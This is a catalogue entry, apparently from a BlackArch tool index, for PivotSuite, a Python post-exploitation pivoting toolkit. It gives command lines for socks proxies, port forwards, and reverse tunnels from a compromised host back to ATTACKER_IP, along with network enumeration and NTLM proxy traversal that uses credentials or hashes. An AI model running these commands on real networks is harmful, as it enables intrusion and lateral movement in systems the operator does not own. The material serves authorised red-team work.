---
name: "pivotsuite"
categories:
  - blackarch-networking
version: "20.5640666"
homepage: "https://github.com/RedTeamOperations/PivotSuite"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-13"
build-system: python
license: GPL3
meta-checked: "2026-11-09"
github-repo: "RedTeamOperations/PivotSuite"
github-stars: 457
github-pushed: "2023-08-26"
github-archived: false
github-issues: 8
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# pivotsuite

> Portable Python pivoting toolkit providing socks proxies, port forwards, and network enumeration through a compromised host.

## What it's for

PivotSuite turns a single compromised machine into a network pivot. It runs as either server or client (pure Python, standard library only, no admin rights needed on the pivot host): with a forward connection the server runs on the reachable compromised host and exposes a socks5 proxy or a single port forward into subnets only that host can reach; when the host sits behind NAT or an egress-filtering firewall, the server runs on the operator's machine and the client on the host dials back with a reverse tunnel. It supports TCP and UDP relays, single/double/multi-level pivoting, NTLM-authenticated corporate proxies, and client-side network enumeration (host discovery, port scanning, OS command execution). Think of it as a standalone alternative to ssh -D or chisel when no SSH is available and reverse connectivity is the only option.

## Typical use cases

### Socks5 proxy on a directly reachable host

Reach internal subnets through the compromised machine.

```
pivotsuite.py -S -F --server-option SP --server-ip 0.0.0.0 --server-port 7777
```

Outcome: the pivot host listens on port 7777 as a socks5 server; point proxychains at it from the operator machine to reach hosts that are only routable from the pivot.

### Single port forward through the pivot host

Expose one internal service without a full proxy.

```
pivotsuite.py -S -F --server-option PF --network-protocol T --remote-ip 198.51.100.20 --remote-port 3389 --server-ip 198.51.100.10 --server-port 8838
```

Outcome: the pivot host (198.51.100.10) listens on 8838 and relays TCP to port 3389 on the otherwise unreachable 198.51.100.20; use `--network-protocol U` for a UDP relay.

### Start the reverse-tunnel server (operator side)

Prepare to receive a pivot when the target cannot be dialed into.

```
pivotsuite.py -S -W
```

Outcome: runs on the operator machine in reverse-connection mode, listening on port 7777 (default) for PivotSuite clients to dial back.

### Dial back from behind NAT (pivot side)

Bring the tunnel up from the compromised host.

```
pivotsuite.py -C -O SP --server-ip ATTACKER_IP --server-port 7777
```

Outcome: the client on the compromised host connects out to the operator's server; a socks5 proxy becomes available on the operator side, tunneled through the reverse connection.

### Enumerate the compromised host's network

Discover what the pivot can see.

```
pivotsuite.py -C -O NE --server-ip ATTACKER_IP --server-port 7777
```

Outcome: the client performs host discovery, port scanning, and OS command execution on its own environment and reports the results back over the tunnel to the server console.

### Egress through an NTLM-authenticated corporate proxy

Build the reverse tunnel when the proxy requires login.

```
pivotsuite.py -C -O SP --ntlm-proxy-ip 198.51.100.1 --ntlm-proxy-port 8080 --username user --password Password1 --domain CORP --server-ip ATTACKER_IP --server-port 7777
```

Outcome: the client authenticates to the corporate proxy with NTLM credentials (or `--hashes LM:NTHASH` instead of a password) and establishes the socks tunnel through it.

*No corpus evidence — derived from upstream documentation.*
